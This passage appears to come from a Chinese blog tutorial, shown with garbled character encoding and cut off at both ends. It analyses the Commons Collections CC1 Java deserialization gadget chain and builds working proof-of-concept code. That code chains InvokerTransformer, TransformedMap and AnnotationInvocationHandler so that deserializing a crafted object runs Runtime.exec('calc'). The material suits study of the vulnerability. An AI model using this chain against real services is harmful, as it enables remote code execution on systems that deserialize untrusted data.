Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        Runtime runtime = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(runtime);</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">//é€šè¿‡ChainedTransformerå®ç° InvokerTransformeræ–¹æ³•è·å–runtimeå®ä¾‹ï¼Œå¹¶æ‰§è¡Œä»£ç </span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"> </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(Runtime.class);</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">//åˆ›å»ºæ„é€ å™¨</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">//ä¿è¯å¯ä»¥è®¿é—®åˆ°</span></span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//å®ä¾‹åŒ–ä¼ å‚ï¼Œæ³¨è§£å’Œæ„é€ å¥½çš„Map</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line"> </span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®é€šè¿‡ä¸Šé¢çš„å‡½æ•°ä»‹ç»å¯ä»¥çŸ¥é“invokerTransformerä¸­çš„transformæ–¹æ³•å°±æ˜¯ä¸€ä¸ªå¯ä»¥è°ƒç”¨ä»»æ„ç±»ä¸­çš„æ–¹æ³•çš„ä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥å®ƒåœ¨è¿™é‡Œç®—æ˜¯æˆ‘ä»¬ååºåˆ—åŒ–æœ€ç»ˆæ‰§è¡Œçš„ç‚¹æ¥è¿›è¡Œæ¶æ„æ“ä½œã€‚é‚£ä¹ˆä¸‹é¢æˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°ä¸€ä¸ªè°è°ƒç”¨äº†è¿™ä¸ªtransformæ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°†è°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„å¯¹è±¡ç»™æ”¹æˆinvokerTransformerå¯¹è±¡</p><p>æ‰€ä»¥ç¬¬ä¸€æ­¥æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªè°ƒç”¨è¯¥æ–¹æ³•çš„å‡½æ•°æ˜¯TransformedMapä¸­çš„CheckSetValueæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714487775144-4f98f606-3add-4d77-ad37-f4daee4d213b.png"></p><p>é€šè¿‡å¯¹è¯¥ç±»çš„æ„é€ æ–¹æ³•çš„åˆ†æå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥ä¼ å…¥ä¸‰ä¸ªå‚æ•°å…·ä½“å¦‚ä¸‹ä»£ç æ‰€ç¤º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//æ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªä¸ºMap,æˆ‘ä»¬å¯ä»¥ä¼ å…¥ä¹‹å‰è®²åˆ°çš„HashMap,ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªå°±æ˜¯Transformeræˆ‘ä»¬éœ€è¦çš„äº†ï¼Œå¯æ§ã€‚</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¥å—ä¸€ä¸ªå¯¹è±¡ç±»å‹çš„å‚æ•°</span></span><br><span class="line"><span class="comment">//è¿”å›valueTransformerå¯¹åº”çš„transformæ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿™é‡Œå°±éœ€è¦è®©valueTransformerä¸ºæˆ‘ä»¬ä¹‹å‰çš„invokerTransformerå¯¹è±¡</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ä¼ å…¥valueTransformerè¿™ä¸ªå‚æ•°æ—¶è®©å…¶ä¸ºinvokerTransformerå¯¹è±¡ï¼Œä½†æ˜¯ç”±äºè¯¥ç±»æ˜¯protectedçš„ç±»å‹æ‰€ä»¥ä¸èƒ½ç›´æ¥å®ä¾‹åŒ–ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°è¯¥ç±»ä¸­æœ‰ä¸€ä¸ªé™æ€æ–¹æ³• decorate()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å¯ä»¥ç›´æ¥è°ƒç”¨è¯¥æ–¹æ³•ï¼Œå°†invokerTransformerå¯¹è±¡æ³¨å…¥è¿›å»ã€‚æ­¤æ—¶CheckSetValueä¸­çš„valueTransformerå°±å¯ä»¥è¢«æˆ‘ä»¬æ”¹ä¸ºinvokerTransformerå¯¹è±¡ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥å°±éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥è§¦å‘CheckSetValueçš„æ–¹æ³•ã€‚é€šè¿‡è°ƒè¯•å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªMapEntryç±»ä¸­çš„setValueæ–¹æ³•è°ƒç”¨äº†è¯¥æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** The parent map */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(entry);</span><br><span class="line">            <span class="built_in">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åœ¨MapEntryæ–¹æ³•ä¸­ï¼ŒEntryä»£è¡¨çš„æ˜¯Mapä¸­çš„ä¸€ä¸ªé”®å€¼å¯¹ï¼Œè€Œæˆ‘ä»¬åœ¨Mapä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰setValueæ–¹æ³•ï¼Œè€Œæˆ‘ä»¬åœ¨å¯¹Mapè¿›è¡Œéå†çš„æ—¶å€™å¯ä»¥è°ƒç”¨setValueè¿™ä¸ªæ–¹æ³•ã€‚ç®€å•æ¥è¯´å°±æ˜¯é€šè¿‡é€šè¿‡å¯¹setValue()æ–¹æ³•çš„è°ƒç”¨æ¥è§¦å‘checkSetValue()æ–¹æ³• MapEntryçš„çˆ¶ç±»AbstractMapEntryDecoratoråˆå¼•å…¥äº†Map.Entryæ¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è¿›è¡Œå¸¸ç”¨çš„Mapéå†ï¼Œå°±å¯ä»¥è°ƒç”¨setValue()ï¼Œï¼Œç„¶åæ°´åˆ°æ¸ æˆçš„è°ƒcheckSetValue()</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714488730452-190b8a98-e1fa-4f85-8bf0-c42460d081fe.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//ç»™mapä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿éå†</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ„é€ transformedmapæ˜¯è°ƒç”¨tranform()çš„å‰ç½®æ¡ä»¶</span></span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">                map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet()) &#123;   <span class="comment">//éå†Mapå¸¸ç”¨æ ¼å¼</span></span><br><span class="line">            <span class="comment">//è°ƒç”¨setValueæ–¹æ³•ï¼Œé€šè¿‡setValueå»è§¦å‘checkSetValue()</span></span><br><span class="line">            entry.setValue(runtime);      </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>æ¢³ç†ä¸€éè¿‡ç¨‹ï¼š </p><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†TransformedMapè¿™ä¸ªç±»ï¼Œæˆ‘ä»¬æƒ³è¦è°ƒç”¨å…¶ä¸­çš„checkSetValueæ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸ªç±»çš„æ„é€ å™¨æ˜¯peotectedæƒé™ï¼Œåªèƒ½ç±»ä¸­è®¿é—®ï¼Œæ‰€ä»¥æˆ‘ä»¬è°ƒç”¨decorateæ–¹æ³•æ¥å®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œ</p><p> åœ¨æ­¤ä¹‹å‰æˆ‘ä»¬å…ˆå®ä¾‹åŒ–äº†ä¸€ä¸ªHashMap,å¹¶ä¸”è°ƒç”¨äº†putæ–¹æ³•ç»™ä»–èµ‹äº†ä¸€ä¸ªé”®å€¼å¯¹(è¿™é‡Œæ˜¯ä¸ºäº†è®©æˆ‘ä»¬å†åè¾¹çš„éå†ä¸­è°ƒç”¨setValue()æä¾›å‰ç½®æ¡ä»¶)ï¼Œç„¶åæŠŠè¿™ä¸ªmapå½“æˆå‚æ•°ä¼ å…¥ï¼Œå®ä¾‹åŒ–æˆäº†ä¸€ä¸ªtransformedmapå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡ä¹Ÿæ˜¯Mapç±»å‹çš„ï¼Œ</p><p> ç„¶åæˆ‘ä»¬å¯¹è¿™ä¸ªå¯¹è±¡è¿›è¡Œéå†ï¼Œåœ¨éå†è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥è°ƒç”¨setValueæ–¹æ³•ï¼Œè€Œæ°å¥½åˆé‡åˆ°äº†ä¸€ä¸ªé‡å†™äº†setValueçš„çˆ¶ç±»ï¼Œè¿™ä¸ªé‡å†™çš„æ–¹æ³•åˆšå¥½è°ƒç”¨äº†checkSetValueæ–¹æ³•ï¼Œè¿™æ ·å°±å½¢æˆäº†ä¸€ä¸ªé—­ç¯</p><p>ä¸‹é¢å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªreadObjectä¸­è°ƒç”¨äº†setValueè¿™ä¸ªæ–¹æ³•ï¼šæ‰¾åˆ°äº†AnnotationInvocationHandlerè¿™ä¸ªç±»ä¸­çš„readObjectè°ƒç”¨äº†è¯¥æ–¹æ³•å¦‚ä¸‹ä»£ç æ‰€ç¤ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ‰¾åˆ°è¯¥ç±»çš„æ„é€ æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°memberValueæ˜¯å¯æ§çš„æ˜¯å¯ä»¥ç”±æ„é€ æ–¹æ³•ç›´æ¥ä¼ å…¥çš„ã€‚æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥ç€æ‰‹æ„é€ ä¸€ä¸‹è¯¥é“¾ï¼Œä½†æ˜¯åœ¨å†™çš„æ—¶å€™ç”±äºè¯¥ç±»æ˜¯javaçš„å†…éƒ¨ç±»æ‰€ä»¥éœ€è¦åå°„æ¥è°ƒç”¨å¦‚ä¸‹ä»£ç æ‰€ç¤ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å®šä¹‰åºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å®šä¹‰ååºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//ç»™mapä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿éå†</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ„é€ transformedmapæ˜¯è°ƒç”¨tranform()çš„å‰ç½®æ¡ä»¶</span></span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">                map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–sun.reflect.annotation.AnnotationInvocationHandlerç±»çš„Classå¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="comment">//serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–æ—¶è¿è¡ŒæŠ¥é”™è¿™æ˜¯ä¸ºä»€ä¹ˆ:</p><p>é—®é¢˜1ï¼š</p><p><a href="https://xz.aliyun.com/t/7031?time__1311=n4+xnD0GDti=LxQTq05+bDyCbdbd4YvjPx&alichlgref=https://xz.aliyun.com/t/12715?time__1311=mqmhDvOD7GkD8Dl6%252BG78cyuxfhDIgD0I5x&alichlgref=https%253A%252F%252Fwww.google.com%252F#toc-7">https://xz.aliyun.com/t/7031?time__1311&#x3D;n4%2BxnD0GDti%3DLxQTq05%2BbDyCbdbd4YvjPx&amp;alichlgref&#x3D;https%3A%2F%2Fxz.aliyun.com%2Ft%2F12715%3Ftime__1311%3DmqmhDvOD7GkD8Dl6%252BG78cyuxfhDIgD0I5x%26alichlgref%3Dhttps%253A%252F%252Fwww.google.com%252F#toc-7</a></p><p>é€šè¿‡æŸ¥çœ‹Runtimeç±»å‘ç°æ²¡æœ‰å®ç°serializableæ˜¯ä¸å¯åºåˆ—åŒ–çš„æ‰€ä»¥éœ€è¦é€šè¿‡åå°„æ¥è¿›è¡Œæ„é€ </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714491023957-6fd90bbe-7cf0-428e-b273-33c398566325.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class rc=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);                 <span class="comment">//è·å–ç±»åŸå‹</span></span><br><span class="line">        Method getRuntime= rc.getDeclaredMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);    <span class="comment">//è·å–getRuntimeæ–¹æ³•ï¼Œ</span></span><br><span class="line">        Runtime r=(Runtime) getRuntime.invoke(<span class="literal">null</span>,<span class="literal">null</span>);    <span class="comment">//è·å–å®ä¾‹åŒ–å¯¹è±¡ï¼Œå› ä¸ºè¯¥æ–¹æ³•ä¸ºæ— å‚æ–¹æ³•ï¼Œæ‰€ä»¥å…¨ä¸ºnull</span></span><br><span class="line">        Method exec=rc.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);        <span class="comment">//è·å–execæ–¹æ³•</span></span><br><span class="line">        exec.invoke(r,<span class="string">&quot;calc&quot;</span>); </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦å°†å…¶æ”¹é€ æˆInvokerTransformerçš„å½¢å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 